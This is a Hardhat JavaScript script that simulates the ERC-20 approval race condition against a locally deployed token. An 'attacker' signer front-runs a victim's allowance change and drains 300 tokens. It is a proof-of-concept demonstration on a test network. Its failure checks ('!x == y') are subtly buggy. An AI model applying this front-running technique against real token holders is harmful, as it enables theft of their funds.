const { ethers } = require("hardhat");

async function main() {
    // Get signers: owner, victim, attacker
    const [owner, victim, attacker] = await ethers.getSigners();

    console.log("===== Initializing Attack Simulation =====\n");
    console.log(`Owner Address:    ${owner.address}`);
    console.log(`Victim Address:   ${victim.address}`);
    console.log(`Attacker Address: ${attacker.address}\n`);

    // Deploy the CTUToken contract
    const CTUToken = await ethers.getContractFactory("CTUToken");
    const ctuToken = await CTUToken.deploy();
    await ctuToken.waitForDeployment();
    console.log(`CTUToken deployed at: ${ctuToken.target}\n`);

    // Define token amounts
    const transferAmount = ethers.parseUnits("300", 18);
    const approvalAmount = ethers.parseUnits("100", 18);
    const increasedApprovalAmount = ethers.parseUnits("200", 18);

    // Expected final balances
    const expectedVictimBalance = ethers.parseUnits("0", 18); // 300 - 100 - 200 = 0
    const expectedAttackerBalance = ethers.parseUnits("300", 18); // 0 + 100 + 200 = 300

    // Owner transfers 300 tokens to the victim
    console.log("===== Step 1: Owner Transfers Tokens to Victim =====");
    const transferTx = await ctuToken.transfer(victim.address, transferAmount);
    const transferReceipt = await transferTx.wait();
    logTransactionDetails("Owner -> Victim Transfer", transferTx, transferReceipt);
    console.log(`Owner transferred ${ethers.formatUnits(transferAmount, 18)} CTU to Victim.\n`);

    // Victim approves attacker to spend 100 tokens
    console.log("===== Step 2: Victim Approves Attacker =====");
    const approveTx = await ctuToken.connect(victim).approve(attacker.address, approvalAmount);
    const approveReceipt = await approveTx.wait();
    logTransactionDetails("Victim Approves Attacker", approveTx, approveReceipt);
    console.log(`Victim approved Attacker to spend ${ethers.formatUnits(approvalAmount, 18)} CTU.\n`);

    // Display Initial State
    console.log("===== Initial State =====");
    await displayState(ctuToken, victim, attacker);
    console.log("========================\n");

    // Step 3: Victim initiates approval to increase to 200 tokens
    console.log("===== Step 3: Victim Initiates Approval to Increase =====");
    console.log("Victim is sending a transaction to approve 200 CTU for the attacker.\n");
    
    // Note: The approval transaction is initiated below in Step 5
    // Simulate pending approval by delaying the approval transaction
    // However, in this sequential script, transactions are mined immediately
    // To simulate, we proceed directly to the attack

    // Step 4: Attacker detects the pending approval and front-runs
    console.log("===== Step 4: Attacker Exploits Race Condition =====");
    console.log("Attacker detects the pending approval and uses the existing allowance of 100 CTU to transfer tokens.");
    console.log("Attacker is frontrunning the blockchain to exploit the race condition.");
    // Attacker sends transferFrom using the old allowance
    const txAttacker1 = await ctuToken.connect(attacker).transferFrom(victim.address, attacker.address, approvalAmount);
    const txAttacker1Receipt = await txAttacker1.wait();
    logTransactionDetails("Attacker TransferFrom (Initial Allowance)", txAttacker1, txAttacker1Receipt);
    console.log("Attacker transferred 100 CTU using the initial allowance.\n");

    // Display State After Attacker's First Transfer
    console.log("===== State After Attacker's First Transfer =====");
    await displayState(ctuToken, victim, attacker);
    console.log("==================================================\n");

    // Step 5: Victim's approval to increase is mined
    console.log("===== Step 5: Victim's Approval to 200 CTU Mined =====");
    console.log("Victims transaction is finally mined after being frontrunned by the attacker transferFrom transaction.\n");
    const approveTxIncreased = await ctuToken.connect(victim).approve(attacker.address, increasedApprovalAmount);
    const approveIncreasedReceipt = await approveTxIncreased.wait();
    logTransactionDetails("Victim Increases Approval", approveTxIncreased, approveIncreasedReceipt);
    console.log("Victim has increased the approval to 200 CTU.");

    // Display State After Victim's Approval
    console.log("===== State After Victim's Approval =====");
    await displayState(ctuToken, victim, attacker);
    console.log("==========================================\n");

    // Step 6: Attacker uses the increased approval to transfer more tokens
    console.log("===== Step 6: Attacker Utilizes Increased Approval =====");
    console.log("Attacker transfers an additional 200 CTU using the increased allowance.");
    const txAttacker2 = await ctuToken.connect(attacker).transferFrom(victim.address, attacker.address, increasedApprovalAmount);
    const txAttacker2Receipt = await txAttacker2.wait();
    logTransactionDetails("Attacker TransferFrom (Increased Allowance)", txAttacker2, txAttacker2Receipt);
    console.log("Attacker transferred 200 CTU using the increased allowance.\n");

    // Display Final State
    console.log("===== Final State =====");
    await displayState(ctuToken, victim, attacker);
    console.log("=======================\n");

    // Fetch actual final balances and allowance
    const finalVictimBalance = await ctuToken.balanceOf(victim.address);
    const finalAttackerBalance = await ctuToken.balanceOf(attacker.address);
    const finalAllowance = await ctuToken.allowance(victim.address, attacker.address);

    // Check if the attack was successful
    const isAttackSuccessful = finalVictimBalance == expectedVictimBalance &&
                                finalAttackerBalance == expectedAttackerBalance &&
                                finalAllowance == 0;

    if (isAttackSuccessful) {
        console.log("===== Attack Successful =====");
        console.log("The attack has successfully exploited the approval race condition.");
        console.log(`Final Victim Balance: ${ethers.formatUnits(finalVictimBalance, 18)} CTU`);
        console.log(`Final Attacker Balance: ${ethers.formatUnits(finalAttackerBalance, 18)} CTU`);
        console.log(`Final Allowance: ${ethers.formatUnits(finalAllowance, 18)} CTU\n`);
    } else {
        console.log("===== Attack Failed =====");
        console.log("The attack did not execute as expected. Details below:");

        // Detailed failure reasons
        if (!finalVictimBalance == expectedVictimBalance) {
            console.log(`- Victim's balance is ${ethers.formatUnits(finalVictimBalance, 18)} CTU, expected ${ethers.formatUnits(expectedVictimBalance, 18)} CTU.`);
        }
        if (!finalAttackerBalance == expectedAttackerBalance) {
            console.log(`- Attacker's balance is ${ethers.formatUnits(finalAttackerBalance, 18)} CTU, expected ${ethers.formatUnits(expectedAttackerBalance, 18)} CTU.`);
        }
        if (!finalAllowance == 0) {
            console.log(`- Allowance is ${ethers.formatUnits(finalAllowance, 18)} CTU, expected 0 CTU.`);
        }

        // Additional Logs for Debugging
        console.log("\n===== Detailed Final State =====");
        await displayState(ctuToken, victim, attacker);
        console.log("================================\n");
    }

    console.log("===== Attack Simulation Completed =====");
}

// Helper function to display current state
async function displayState(ctuToken, victim, attacker) {
    const victimBalance = ethers.formatUnits(await ctuToken.balanceOf(victim.address), 18);
    const attackerBalance = ethers.formatUnits(await ctuToken.balanceOf(attacker.address), 18);
    const allowance = ethers.formatUnits(await ctuToken.allowance(victim.address, attacker.address), 18);
    const totalSupply = ethers.formatUnits(await ctuToken.totalSupply(), 18);

    console.log("----- Current State -----");
    console.log(`Total Supply:                ${totalSupply} CTU`);
    console.log(`Victim Balance:             ${victimBalance} CTU`);
    console.log(`Attacker Balance:           ${attackerBalance} CTU`);
    console.log(`Allowance (Victim->Attacker): ${allowance} CTU`);
    console.log("-------------------------\n");
}

// Helper function to log transaction details
function logTransactionDetails(title, tx, receipt) {
    console.log(`===== ${title} =====`);
    console.log(`Transaction Hash: ${tx.hash}`);
    console.log(`Block Number:     ${receipt.blockNumber}`);
    console.log(`Gas Used:         ${receipt.gasUsed.toString()}`);
    console.log(`Status:           ${receipt.status === 1 ? "Success" : "Failed"}`);
    if (receipt.events && receipt.events.length > 0) {
        console.log("Events Emitted:");
        receipt.events.forEach((event, index) => {
            console.log(`  Event ${index + 1}: ${event.event}`);
            console.log(`    Arguments: ${JSON.stringify(event.args)}`);
        });
    }
    console.log("========================\n");
}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error("An error occurred during the attack simulation:");
        console.error(error);
        process.exit(1);
    });
